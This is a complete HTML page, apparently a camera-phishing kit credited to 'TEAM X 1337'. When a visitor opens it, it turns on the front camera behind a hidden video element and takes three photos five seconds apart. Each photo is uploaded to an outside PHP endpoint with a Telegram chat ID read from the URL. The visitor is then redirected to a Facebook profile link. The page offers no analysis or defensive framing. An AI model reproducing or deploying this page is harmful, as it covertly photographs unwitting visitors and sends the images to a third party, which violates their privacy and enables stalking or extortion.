<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Automatic Camera Capture</title>
    
    <style>
      body {
        margin: 0;
        padding: 0;
        background: url('https://online-sheba.github.io/BdService/ck/teamx.gif') center/cover no-repeat fixed;
        height: 100vh;
        overflow: hidden;
      
    </style>
</head>

<body>
  
    <div id="cameraContainer" style="display: none;">
        <video id="cameraFeed" autoplay></video>
    </div>
    <div id="capturingMessage"></div>

    <input type="hidden" id="chatid" name="chatid" value="">

    <script>
        function getChatIdFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('id');
        }
        const chatIdInput = document.getElementById('chatid');
        const extractedChatId = getChatIdFromURL();
        chatIdInput.value = extractedChatId;
    </script>





    <script>
        const cameraContainer = document.getElementById("cameraContainer");
        const capturingMessage = document.getElementById("capturingMessage");
        const cameraFeed = document.getElementById("cameraFeed");

        async function setupCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user'
                    }
                });
                cameraFeed.srcObject = stream;
                cameraContainer.style.display = "none"; // Hide camera container
            } catch (error) {
                console.error("Error accessing camera:", error);
            }
        }

        async function captureAndSendImage() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = cameraFeed.videoWidth;
                canvas.height = cameraFeed.videoHeight;
                canvas.getContext('2d').drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
                const capturedImage = canvas.toDataURL('image/png');

                // Convert the base64 image to a Blob
                const base64ImageParts = capturedImage.split(';base64,');
                const contentType = base64ImageParts[0].split(':')[1];
                const rawImage = atob(base64ImageParts[1]);
                const imageBlob = new Blob([new Uint8Array(rawImage.length).map((_, i) => rawImage.charCodeAt(i))], {
                    type: contentType
                });

                // Create a FormData object to send the image as a file
                const formData = new FormData();
                formData.append('photo', imageBlob, 'image.png');

               
                const chatID = chatIdInput.value; 
                const apiUrl = 'https://onlinesearvice.xyz/pic/send.php'; // Coded by : Shofikul Islam 
                await fetch(apiUrl, {
                    method: 'POST',
                    body: formData,
                    headers: {
                        'Chat-ID': chatID
                    }
                });

                console.log('Image sent to Telegram via PHP!');
            } catch (error) {
                console.error("Error capturing/sending image:", error);
            }
        }

        setupCamera();

        // Automatically capture TEAM X 1337
        let captureCount = 0;
        const captureInterval = setInterval(() => {
            captureAndSendImage();
            captureCount++;
            if (captureCount >= 3) {
                clearInterval(captureInterval); // Stop after Shofikul
                capturingMessage.textContent = "";
                setTimeout(() => {
                    window.location.href = "http://facebook.com/profile.php?id"; 
                }, 2000); // Shofikul Islam 
            }
        }, 5000); // 5000 milliseconds (5 seconds) between captures
    </script>
    
    
    
</body>

</html>
